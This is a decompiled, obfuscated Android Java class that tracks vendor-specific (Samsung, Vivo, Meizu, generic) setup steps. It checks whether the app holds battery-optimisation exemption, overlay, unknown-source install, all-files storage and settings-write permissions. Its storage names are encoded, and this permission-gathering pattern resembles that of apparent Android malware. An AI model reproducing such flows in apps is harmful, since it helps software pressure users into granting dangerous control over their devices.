package p000;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import com.storm.safe.rock.service.modules.yw5xud.C0364a1;
import com.storm.safe.rock.service.modules.yw5xud.C0366a3;
import com.storm.safe.rock.service.modules.yw5xud.C0370a7;
import com.storm.safe.rock.service.modules.yw5xud.C0371a8;
import com.storm.safe.rock.service.modules.yw5xud.GenericSteps$FlowType;
import com.storm.safe.rock.service.modules.yw5xud.MeizuSteps$FlowType;
import com.storm.safe.rock.service.modules.yw5xud.SamsungSteps$FlowType;
import com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType;
import com.storm.safe.rock.util.StringUtil;
import java.util.LinkedHashMap;
import kotlin.NoWhenBranchMatchedException;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class w20 {

    /* renamed from: a0 */
    public final SharedPreferences f60755a0;

    /* renamed from: a1 */
    public final LinkedHashMap f60756a1 = new LinkedHashMap();

    /* renamed from: a2 */
    public final int f60757a2 = 2;

    /* renamed from: a3 */
    public final /* synthetic */ Object f60758a3;

    public w20(C0366a3 c0366a3) {
        this.f60758a3 = c0366a3;
        this.f60755a0 = c0366a3.f55082a1.getSharedPreferences(StringUtil.m212470a0("JlwYIFgHCiJYJhRKBTtZLR8="), 0);
    }

    /* renamed from: a0 */
    public void m214985a0(String str) {
        this.f60755a0.edit().remove(str).apply();
        t60.m214704c5(((C0371a8) this.f60758a3).f55141a2, "[子步骤] 🔄 清除标记: ".concat(str));
    }

    /* renamed from: a1 */
    public boolean m214986a1(GenericSteps$FlowType genericSteps$FlowType) {
        return ((Number) this.f60756a1.getOrDefault(genericSteps$FlowType, 0)).intValue() >= this.f60757a2;
    }

    /* renamed from: a2 */
    public boolean m214987a2(SamsungSteps$FlowType samsungSteps$FlowType) {
        return ((Number) this.f60756a1.getOrDefault(samsungSteps$FlowType, 0)).intValue() >= this.f60757a2;
    }

    /* renamed from: a3 */
    public int m214988a3(GenericSteps$FlowType genericSteps$FlowType) {
        LinkedHashMap linkedHashMap = this.f60756a1;
        int iIntValue = ((Number) linkedHashMap.getOrDefault(genericSteps$FlowType, 0)).intValue() + 1;
        linkedHashMap.put(genericSteps$FlowType, Integer.valueOf(iIntValue));
        return iIntValue;
    }

    /* renamed from: a4 */
    public void m214989a4(SamsungSteps$FlowType samsungSteps$FlowType) {
        LinkedHashMap linkedHashMap = this.f60756a1;
        linkedHashMap.put(samsungSteps$FlowType, Integer.valueOf(((Number) linkedHashMap.getOrDefault(samsungSteps$FlowType, 0)).intValue() + 1));
    }

    /* renamed from: a5 */
    public boolean m214990a5(MeizuSteps$FlowType meizuSteps$FlowType) {
        Context context = ((C0366a3) this.f60758a3).f55082a1;
        t60.m214695b6(meizuSteps$FlowType, "flowType");
        int iOrdinal = meizuSteps$FlowType.ordinal();
        if (iOrdinal == 0) {
            return this.f60755a0.getBoolean(meizuSteps$FlowType.name() + "_completed", false);
        }
        if (iOrdinal == 1) {
            try {
                Object systemService = context.getSystemService("power");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                return ((PowerManager) systemService).isIgnoringBatteryOptimizations(context.getPackageName());
            } catch (Exception unused) {
                return false;
            }
        }
        if (iOrdinal == 2) {
            return Settings.canDrawOverlays(context);
        }
        if (iOrdinal != 3) {
            throw new NoWhenBranchMatchedException();
        }
        if (Build.VERSION.SDK_INT >= 30) {
            return Environment.isExternalStorageManager();
        }
        return true;
    }

    /* renamed from: a6 */
    public boolean m214991a6(VivoSteps$FlowType vivoSteps$FlowType) {
        t60.m214695b6(vivoSteps$FlowType, "flowType");
        switch (vivoSteps$FlowType.ordinal()) {
            case 0:
            case 1:
            case 2:
            case 3:
            case 4:
            case 7:
            case 8:
            case 9:
            case 10:
                return this.f60755a0.getBoolean(vivoSteps$FlowType.name() + "_completed", false);
            case 5:
                return Settings.canDrawOverlays(((C0371a8) this.f60758a3).f55140a1);
            case 6:
                if (Build.VERSION.SDK_INT >= 30) {
                    return Environment.isExternalStorageManager();
                }
                return true;
            default:
                throw new NoWhenBranchMatchedException();
        }
    }

    /* renamed from: a7 */
    public boolean m214992a7(GenericSteps$FlowType genericSteps$FlowType) {
        C0364a1 c0364a1 = (C0364a1) this.f60758a3;
        Context context = c0364a1.f55048a1;
        int iOrdinal = genericSteps$FlowType.ordinal();
        SharedPreferences sharedPreferences = this.f60755a0;
        boolean zIsIgnoringBatteryOptimizations = false;
        switch (iOrdinal) {
            case 0:
                return sharedPreferences.getBoolean(genericSteps$FlowType.name() + "_completed", false);
            case 1:
                try {
                    Object systemService = context.getSystemService("power");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                    zIsIgnoringBatteryOptimizations = ((PowerManager) systemService).isIgnoringBatteryOptimizations(context.getPackageName());
                } catch (Exception unused) {
                }
                return zIsIgnoringBatteryOptimizations;
            case 2:
                return sharedPreferences.getBoolean(genericSteps$FlowType.name() + "_completed", false);
            case 3:
                return Settings.canDrawOverlays(context);
            case 4:
                if (Build.VERSION.SDK_INT >= 26) {
                    try {
                        return context.getPackageManager().canRequestPackageInstalls();
                    } catch (Exception e) {
                        tz0.m214810b0("[未知来源] 检查权限异常（可能未声明REQUEST_INSTALL_PACKAGES）: ", e.getMessage(), c0364a1.f55049a2);
                        return true;
                    }
                }
                return true;
            case 5:
                if (Build.VERSION.SDK_INT >= 30) {
                    return Environment.isExternalStorageManager();
                }
                return true;
            case 6:
                return sharedPreferences.getBoolean(genericSteps$FlowType.name() + "_completed", false);
            default:
                throw new NoWhenBranchMatchedException();
        }
    }

    /* renamed from: a8 */
    public boolean m214993a8(SamsungSteps$FlowType samsungSteps$FlowType) {
        Context context = ((C0370a7) this.f60758a3).f55134a1;
        int iOrdinal = samsungSteps$FlowType.ordinal();
        SharedPreferences sharedPreferences = this.f60755a0;
        if (iOrdinal == 0) {
            return sharedPreferences.getBoolean(samsungSteps$FlowType.name() + "_completed", false);
        }
        if (iOrdinal == 1) {
            try {
                Object systemService = context.getSystemService("power");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                return ((PowerManager) systemService).isIgnoringBatteryOptimizations(context.getPackageName());
            } catch (Exception unused) {
                return false;
            }
        }
        if (iOrdinal == 2) {
            return sharedPreferences.getBoolean(samsungSteps$FlowType.name() + "_completed", false);
        }
        if (iOrdinal == 3) {
            return Settings.canDrawOverlays(context);
        }
        if (iOrdinal == 4) {
            return Settings.System.canWrite(context);
        }
        if (iOrdinal != 5) {
            throw new NoWhenBranchMatchedException();
        }
        if (Build.VERSION.SDK_INT >= 30) {
            return Environment.isExternalStorageManager();
        }
        return true;
    }

    /* renamed from: a9 */
    public void m214994a9(GenericSteps$FlowType genericSteps$FlowType) {
        this.f60755a0.edit().putBoolean(genericSteps$FlowType.name() + "_completed", true).apply();
    }

    /* renamed from: b0 */
    public void m214995b0(MeizuSteps$FlowType meizuSteps$FlowType) {
        t60.m214695b6(meizuSteps$FlowType, "flowType");
        this.f60755a0.edit().putBoolean(meizuSteps$FlowType.name() + "_completed", true).apply();
        tz0.m214809a9("[流程状态] ", meizuSteps$FlowType.f54175a0, " 标记为已完成", ((C0366a3) this.f60758a3).f55083a2);
    }

    /* renamed from: b1 */
    public void m214996b1(SamsungSteps$FlowType samsungSteps$FlowType) {
        this.f60755a0.edit().putBoolean(samsungSteps$FlowType.name() + "_completed", true).apply();
    }

    /* renamed from: b2 */
    public void m214997b2(VivoSteps$FlowType vivoSteps$FlowType) {
        t60.m214695b6(vivoSteps$FlowType, "flowType");
        this.f60755a0.edit().putBoolean(vivoSteps$FlowType.name() + "_completed", true).apply();
        tz0.m214809a9("[流程状态] ✅ ", vivoSteps$FlowType.f54737a0, " 标记为已完成", ((C0371a8) this.f60758a3).f55141a2);
    }

    /* renamed from: b3 */
    public void m214998b3(String str) {
        this.f60755a0.edit().putBoolean(str, true).apply();
        t60.m214704c5(((C0371a8) this.f60758a3).f55141a2, "[子步骤] ✅ 标记完成: ".concat(str));
    }

    public w20(C0370a7 c0370a7) {
        this.f60758a3 = c0370a7;
        this.f60755a0 = c0370a7.f55134a1.getSharedPreferences(StringUtil.m212470a0("OFgcKVg2CxFRPSROLilZORg7RA49DQ=="), 0);
    }

    public w20(C0371a8 c0371a8) {
        this.f60758a3 = c0371a8;
        this.f60755a0 = c0371a8.f55140a1.getSharedPreferences(StringUtil.m212470a0("PVAHNXI+ACFADjhNEC5YKw=="), 0);
    }

    public w20(C0364a1 c0364a1) {
        this.f60758a3 = c0364a1;
        this.f60755a0 = c0364a1.f55048a1.getSharedPreferences(StringUtil.m212470a0("LFwfP18xDxFRPSROLilZORg7RA49CA=="), 0);
    }
}
